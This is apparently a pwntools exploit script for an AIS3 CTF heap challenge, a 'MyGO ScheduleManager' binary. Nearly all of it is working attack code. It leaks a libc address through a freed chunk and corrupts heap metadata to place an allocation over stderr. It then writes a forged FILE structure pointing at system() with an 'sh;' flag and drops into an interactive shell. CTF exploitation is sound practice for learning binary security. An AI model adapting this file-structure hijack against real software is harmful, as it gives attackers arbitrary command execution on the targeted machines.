from pwn import *
from libs.NAUP_pwn_lib import *
import time
from libs.NAUP_filestructure_lib import *
from libs.NAUP_fmt_lib import *

#### This is a CTF pwn templates make by Naup

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()
def tsl(): return time.sleep(0.2)

x64_env()

REMOTE_LOCAL=input("local?(y/n):")

if REMOTE_LOCAL=="y":
    r=process('./chal')
    debug_init()
    
else:                                           
    REMOTE_INFO=split_nc("nc chals1.ais3.org 51001")

    REMOTE_IP=REMOTE_INFO[0]
    REMOTE_PORT=int(REMOTE_INFO[1])

    r=remote(REMOTE_IP,REMOTE_PORT)

### attach
if input('attach?(y/n)') == 'y':
    p(r)

### heap IO
def login():
    sla(b"Username > ", b"MyGO!!!!!")
    sla(b"Password > ", b"TomorinIsCute")

def add(item):
    sla(b"< MyGO @ ScheduleManager $ > ", b"1")
    sla(b"Input item > ", item)

def edit(idx, item):
    sla(b"< MyGO @ ScheduleManager $ > ", b"2")
    sla(b"Index > ", str(idx).encode())
    sla(b"Edit item > ", item)

def delete(idx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"3")
    sla(b"Index > ", str(idx).encode())

def show(idx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"4")
    sla(b"Index > ", str(idx).encode())

def exitf():
    sla(b"< MyGO @ ScheduleManager $ > ", b"5")

### exploit

login()
add(b"a" * 0x500)
add(b"b" * 0x10)
delete(1)
delete(0)

show(0)
r.recvuntil(b'] is ')
leaklibc = (u64(r.recvline().strip()[:6].ljust(8,b'\x00')) << 8 ) + 0x20
libcbase = leaklibc - 0x203b20


IO_STDERR = libcbase + 0x2044e0
libc_system = libcbase + 0x58740

payload1  = p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload1 += p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload1 += p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload1 += p64(IO_STDERR) + p64(0x1d0) + p64(0x1d0) + p64(0)

add(payload1)
delete(0)

add(b'Tomorin')
add(b'Soyorin')
add(b'Rana')

libc_IO_wfile_jumps = libcbase + 0x202228
emptylibc = libcbase + 0x204bc0
fakew_data = IO_STDERR
fake_wow = IO_STDERR + 0x18

payload2  = b"sh;".ljust(8, b"\x00") # _flags

payload2  = payload2.ljust(0x20, b"\x00")
payload2 += p64(1)
payload2  = payload2.ljust(0x30, b"\x00")
payload2 += p64(libc_system)
payload2  = payload2.ljust(0x70, b"\x00")
payload2 += p32(2)
payload2  = payload2.ljust(0x78, b"\x00")
payload2 += p64(0xffffffffffffffff)
payload2  = payload2.ljust(0x88, b"\x00")
payload2 += p64(emptylibc) + p64(0xffffffffffffffff)
payload2  = payload2.ljust(0xa0, b"\x00")
payload2 += p64(fakew_data) 
payload2  = payload2.ljust(0xc0, b"\x00")
payload2 += p32(1)
payload2  = payload2.ljust(0xd8, b"\x00")
payload2 += p64(libc_IO_wfile_jumps + 0x30) + p64(fake_wow)

edit(3, payload2)


sl(b"5")

NAUPINFO("LEAKLIBC", hex(leaklibc))
NAUPINFO("LIBCBASE", hex(libcbase))
NAUPINFO('STD ERROR', hex(IO_STDERR))
### interactive
ita()
